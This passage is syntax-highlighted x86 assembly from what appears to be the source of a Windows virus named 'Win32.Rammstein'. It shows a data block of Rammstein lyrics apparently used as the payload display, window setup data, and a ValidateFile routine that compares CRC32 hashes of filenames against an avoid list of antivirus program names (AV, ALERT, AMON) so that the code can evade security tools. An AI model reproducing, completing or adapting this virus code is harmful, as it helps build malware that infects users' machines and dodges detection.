    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SICH</span><span class="sc0"> </span><span class="sc5">WIE</span><span class="sc0"> </span><span class="sc5">EIN</span><span class="sc0"> </span><span class="sc5">INSEKT</span><span class="sc4">&gt;</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IM</span><span class="sc0"> </span><span class="sc5">SCHLAFE</span><span class="sc0"> </span><span class="sc5">MERKST</span><span class="sc0"> </span><span class="sc5">DU</span><span class="sc0"> </span><span class="sc5">NICHT</span><span class="sc4">&gt;</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DA?</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0"> </span><span class="sc5">DICH</span><span class="sc0"> </span><span class="sc5">STICHT</span><span class="sc4">&gt;</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">GLUCKLICH</span><span class="sc0"> </span><span class="sc5">WERD</span><span class="sc0"> </span><span class="sc5">ICH</span><span class="sc0"> </span><span class="sc5">NIRGENDWO</span><span class="sc4">&gt;</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DER</span><span class="sc0"> </span><span class="sc5">FINGER</span><span class="sc0"> </span><span class="sc5">RUTSCHT</span><span class="sc0"> </span><span class="sc5">NACH</span><span class="sc0"> </span><span class="sc5">MEXIKO</span><span class="sc4">&gt;</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DOCH</span><span class="sc0"> </span><span class="sc5">ER</span><span class="sc0"> </span><span class="sc5">VERSINKT</span><span class="sc0"> </span><span class="sc5">IM</span><span class="sc0"> </span><span class="sc5">OZEAN</span><span class="sc4">&gt;</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SEHNSUCHT</span><span class="sc0"> </span><span class="sc5">IST</span><span class="sc0"> </span><span class="sc5">SO</span><span class="sc0"> </span><span class="sc5">GRAUSAM</span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WOLLT</span><span class="sc0"> </span><span class="sc5">IHR</span><span class="sc0"> </span><span class="sc6">DAS</span><span class="sc0"> </span><span class="sc5">BETT</span><span class="sc0"> </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc5">FLAMMEN</span><span class="sc0"> </span><span class="sc5">SEHEN?</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">WOLLT</span><span class="sc0"> </span><span class="sc5">IHR</span><span class="sc0"> </span><span class="sc6">IN</span><span class="sc0"> </span><span class="sc5">HAUT</span><span class="sc0"> </span><span class="sc5">UND</span><span class="sc0"> </span><span class="sc5">HAAREN</span><span class="sc0"> </span><span class="sc5">UNTERGEHEN?</span><span class="sc4">&gt;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IHR</span><span class="sc0"> </span><span class="sc5">WOLLT</span><span class="sc0"> </span><span class="sc5">DOCH</span><span class="sc0"> </span><span class="sc5">AUCH</span><span class="sc0"> </span><span class="sc5">DEN</span><span class="sc0"> </span><span class="sc5">DOLCH</span><span class="sc0"> </span><span class="sc6">INS</span><span class="sc0"> </span><span class="sc5">LAKEN</span><span class="sc0"> </span><span class="sc5">STECKEN</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IHR</span><span class="sc0"> </span><span class="sc5">WOLLT</span><span class="sc0"> </span><span class="sc5">DOCH</span><span class="sc0"> </span><span class="sc5">AUCH</span><span class="sc0"> </span><span class="sc6">DAS</span><span class="sc0"> </span><span class="sc5">BLUT</span><span class="sc0"> </span><span class="sc5">VOM</span><span class="sc0"> </span><span class="sc5">DEGEN</span><span class="sc0"> </span><span class="sc5">LECKEN</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IHR</span><span class="sc0"> </span><span class="sc5">SEHT</span><span class="sc0"> </span><span class="sc5">DIE</span><span class="sc0"> </span><span class="sc5">KREUZE</span><span class="sc0"> </span><span class="sc5">AUF</span><span class="sc0"> </span><span class="sc5">DEM</span><span class="sc0"> </span><span class="sc5">KISSEN</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IHR</span><span class="sc0"> </span><span class="sc5">MEINT</span><span class="sc0"> </span><span class="sc5">EUCH</span><span class="sc0"> </span><span class="sc5">DARF</span><span class="sc0"> </span><span class="sc5">DIE</span><span class="sc0"> </span><span class="sc5">UNSCHULD</span><span class="sc0"> </span><span class="sc5">KUSSEN</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">IHR</span><span class="sc0"> </span><span class="sc5">GLAUBT</span><span class="sc0"> </span><span class="sc5">ZU</span><span class="sc0"> </span><span class="sc5">TOTEN</span><span class="sc0"> </span><span class="sc5">WARE</span><span class="sc0"> </span><span class="sc5">SCHWER</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">       </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">DOCH</span><span class="sc0"> </span><span class="sc5">WO</span><span class="sc0"> </span><span class="sc5">KOMMEN</span><span class="sc0"> </span><span class="sc10">ALL</span><span class="sc0"> </span><span class="sc5">DIE</span><span class="sc0"> </span><span class="sc5">TOTEN</span><span class="sc0"> </span><span class="sc5">HER</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">SEX</span><span class="sc0"> </span><span class="sc5">IST</span><span class="sc0"> </span><span class="sc5">EIN</span><span class="sc0"> </span><span class="sc5">SCHLACHT</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LIEBE</span><span class="sc0"> </span><span class="sc5">IST</span><span class="sc0"> </span><span class="sc5">KRIEG</span><span class="sc0"> </span><span class="sc4">&gt;</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
    </span><span class="sc5">noter</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc5">RAMMSTEIN</span><span class="sc0">!! </span><span class="sc4">&gt;</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">text_end</span><span class="sc4">:</span><span class="sc0">                                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">list_len</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">text_start</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">wc</span><span class="sc0">               </span><span class="sc5">STD_WINDOW</span><span class="sc0">   </span><span class="sc4">&lt;</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">STD_WINDOW</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">&gt;</span><span class="sc0">
</span><span class="sc5">wintime</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">4000</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hInst</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hAccel</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">htimer</span><span class="sc0">           </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ourhIcon</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">newhwnd</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">msg</span><span class="sc0">              </span><span class="sc5">MSGSTRUCT</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">r</span><span class="sc0">                </span><span class="sc5">RECT</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">lppaint</span><span class="sc0">          </span><span class="sc5">PAINTSTRUCT</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">textmetric</span><span class="sc0">       </span><span class="sc5">TEXTMETRIC</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">                    </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">xmax</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ymax</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">xlength</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ylength</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">xpos</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ypos</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">current</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">hdc</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">chars</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc3">"Z"</span><span class="sc4">-</span><span class="sc3">"A"</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">szTitleName</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.Rammstein'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">szClassName</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RAMMSTEIN'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">DefaultStyle</span><span class="sc0">  </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_OVERLAPPED</span><span class="sc4">+</span><span class="sc5">WS_VISIBLE</span><span class="sc0">           </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ExtendedStyle</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">WS_EX_TOPMOST</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;==================================================;=========================</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ValidateFile</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; ESI = pointer to filename                        ;</span><span class="sc0">
</span><span class="sc6">ret</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">VF_ExceptionExit</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">; Setup a SEH frame</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_lstrlen</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                    </span><span class="sc1">;get the filename length</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">256</span><span class="sc0">                                </span><span class="sc1">;is it too big?</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">invalid_file</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                    </span><span class="sc1">;uppercase the name</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_CharUpperBuffA</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">@endsz</span><span class="sc0">                                      </span><span class="sc1">;go to it's end</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">std</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;and look backwards for</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'\'                                  ;the '</span><span class="sc0">\</span><span class="sc13">'
</span><span class="sc0">       </span><span class="sc6">repnz</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">no_increase</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;if we found one, point it</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_increase</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">                                         </span><span class="sc1">;restore direction</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">avoid_list</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;our avoid list</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">search_next</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                    </span><span class="sc1">;last entry?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">all_names_ok</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                             </span><span class="sc1">;get the name length</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                 </span><span class="sc1">;limit our string to the</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;length with a 0</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">StringCRC32</span><span class="sc0">                            </span><span class="sc1">;and compute a crc32 for</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                     </span><span class="sc1">;the piece...</span><span class="sc0">
       </span><span class="sc6">xchg</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">                 </span><span class="sc1">;restore filename</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">                              </span><span class="sc1">;does it match?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">av_name_found</span><span class="sc0">                            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">;get next...</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_next</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">av_name_found</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">invalid_file</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">stc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">all_names_ok</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;and restore the SEH</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">clc</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">                                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">VF_ExceptionExit</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;if we had an error we</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">                           </span><span class="sc1">;must restore the ESP</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">DeltaRecoverVF</span><span class="sc0">                        </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc5">DeltaRecoverVF</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DeltaRecoverVF</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">invalid_file</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">avoid_list</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc0"></span><span class="sc5">AV</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">_AV</span><span class="sc4">&gt;</span><span class="sc0">                                 </span><span class="sc1">;the list with filenames</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                                        </span><span class="sc1">;to avoid</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">ALERT</span><span class="sc4">&gt;</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc5">crc32</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">AMON</span><span class="sc4">&gt;</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
